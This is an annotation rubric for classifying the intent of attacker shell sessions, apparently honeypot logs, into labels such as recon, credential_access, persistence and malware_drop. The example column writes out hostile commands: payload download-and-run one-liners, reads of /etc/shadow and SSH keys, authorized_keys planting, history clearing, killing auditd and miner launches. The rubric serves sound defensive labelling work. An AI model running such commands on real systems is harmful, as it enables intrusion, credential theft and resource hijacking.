# Annotation rubric: primary intent of a session

Label each item with exactly ONE label. Judge the whole command sequence, not single keywords. Ignore any leaked `<|channel|>...` text (already stripped). Do not open key.csv.

| label | definition | example patterns | common confusions |
|---|---|---|---|
| recon | Learning about the system/environment; no change made. | `uname -a; whoami; ls /`, `cat /proc/cpuinfo`, `crontab -l` | Reading /etc/passwd or /etc/shadow with intent to steal is credential_access, plain listing is recon. |
| credential_access | Harvesting or guessing credentials/keys/secrets. | `cat /etc/shadow`, `find / -name id_rsa -o -name "*password*"`, `cat ~/.ssh/*` | `cat /etc/passwd` alone is recon. Searching for secret files counts as credential_access. |
| privilege_escalation | Trying to gain higher privileges than the current account. | `sudo -l; sudo su`, `find / -perm -4000` (SUID hunt followed by use) | `sudo -l` alone is recon; `su`/`sudo` after login as root is noise. |
| persistence | Keeping access: cron/rc/systemd entries, SSH keys, new or modified accounts. | `echo "ssh-rsa ..." >> ~/.ssh/authorized_keys`, `chpasswd`, `echo "root:x"\|passwd` | `crontab -l` is recon. Changing the root password IS persistence (account manipulation). |
| malware_drop | Downloading and/or running a payload or bot binary. | `wget http://<ip>/x.sh; chmod +x x.sh; ./x.sh`, `tftp -g -r bot`, `curl ... \| sh` | Download with no execution still counts as malware_drop. Busybox probes with no download are recon. |
| resource_hijacking | Deploying/inspecting cryptominers or abusing compute/bandwidth. | `./xmrig -o pool:3333`, `nproc; cat /proc/cpuinfo; ./miner` | CPU inspection alone is recon. A miner fetched by wget is resource_hijacking (outranks malware_drop). |
| defense_evasion | Hiding or disabling defenses: clearing logs/history, killing security tools, timestomping. | `history -c; rm ~/.bash_history`, `chattr +i`, `killall -9 auditd`, `unset HISTFILE` | Cleanup after a download is part of that session's larger goal: apply tie-break. |
| other | Benign, unclear, gibberish, protocol noise, or nothing above fits. | `echo hello`, empty typing, `exit`, scanner banner strings | Do not use other if a plausible intent above is evident. |

## Tie-break (several behaviors in one session)
Pick the furthest-progressed objective in this order:
resource_hijacking > malware_drop > persistence > privilege_escalation > credential_access > defense_evasion > recon > other

## Notes
- `crontab -l` is recon, not persistence.
- Mirai-style `enable; system; shell; sh` plus busybox probes with no download = recon.
- Whole sequence matters: `ls; cat /etc/shadow; wget x; sh x` is malware_drop.
- Put a confidence of 1 (guess), 2 (fairly sure) or 3 (certain) in the confidence column; use notes for anything odd.
- Label independently; do not discuss until agreement.py has been run.
